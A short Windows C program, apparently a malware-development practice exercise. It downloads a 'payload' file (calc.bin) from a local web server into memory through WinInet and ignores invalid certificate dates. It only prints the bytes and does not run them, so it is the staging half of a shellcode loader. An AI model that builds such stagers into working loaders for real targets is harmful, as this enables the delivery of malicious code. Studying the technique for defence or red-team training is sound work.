
#include <stdio.h>
#include <Windows.h>
#include <wininet.h>
#pragma comment(lib, "Wininet.lib")

BOOL GetPayloadFromURL(LPCWSTR url, PBYTE* payload, SIZE_T* size) {
    HANDLE hinternet = NULL;
    HANDLE hinternetfile = NULL;
    LPVOID Tmpbuffer = NULL;
    DWORD dbytestoread = 0; // Initialize to 0
    SIZE_T ssize = 0;
    PBYTE pbyte = NULL;

    hinternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
    if (hinternet == NULL) {
        printf("the internetopen failed with error no %d\n", GetLastError());
        return FALSE; // Return FALSE indicating failure
    }

    hinternetfile = InternetOpenUrl(hinternet, url, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hinternetfile == NULL) {
        printf("the internet file failed with error no %d\n", GetLastError());
        return FALSE; // Return FALSE indicating failure
    }

    Tmpbuffer = LocalAlloc(LPTR, 1024);
    if (Tmpbuffer == NULL) {
        printf("LocalAlloc failed with error no %d\n", GetLastError());
        return FALSE; // Return FALSE indicating failure
    }

    while (TRUE) {
        if (!InternetReadFile(hinternetfile, Tmpbuffer, 1024, &dbytestoread)) {
            printf("internet read file failed with error no %d\n", GetLastError());
            LocalFree(Tmpbuffer); // Free allocated memory before returning
            return FALSE; // Return FALSE indicating failure
        }

        ssize += dbytestoread;

        if (pbyte == NULL) {
            pbyte = (PBYTE)LocalAlloc(LPTR, ssize);
            if (pbyte == NULL) {
                printf("LocalAlloc failed with error no %d\n", GetLastError());
                LocalFree(Tmpbuffer); // Free allocated memory before returning
                return FALSE; // Return FALSE indicating failure
            }
        }
        else {
            pbyte = (PBYTE)LocalReAlloc(pbyte, ssize, LMEM_MOVEABLE | LMEM_ZEROINIT);
            if (pbyte == NULL) {
                printf("LocalReAlloc failed with error no %d\n", GetLastError());
                LocalFree(Tmpbuffer); // Free allocated memory before returning
                return FALSE; // Return FALSE indicating failure
            }
        }

        memcpy(pbyte + ssize - dbytestoread, Tmpbuffer, dbytestoread);

        if (dbytestoread < 1024) {
            break;
        }
    }

    LocalFree(Tmpbuffer); // Free allocated memory

    *payload = pbyte; // Assign the payload pointer
    *size = ssize; // Assign the payload size

    return TRUE; // Return TRUE indicating success
}

int main() {
    LPCWSTR url = L"http://127.0.0.1:8080/calc.bin";

    PBYTE payload = NULL;
    SIZE_T size = 0; // Declare size as SIZE_T instead of SIZE_T*

    if (GetPayloadFromURL(url, &payload, &size)) {
        printf("Payload received successfully.\n");
        printf("Payload size: %lu bytes\n", size);
        printf("payload is %s", payload);

        // Print the hexadecimal representation of the payload here...

        // Free the payload memory after use
        LocalFree(payload);
    }
    else {
        printf("Failed to retrieve payload from URL.\n");
    }

    printf("Press enter to exit.\n");
    getchar();

    return 0;
}
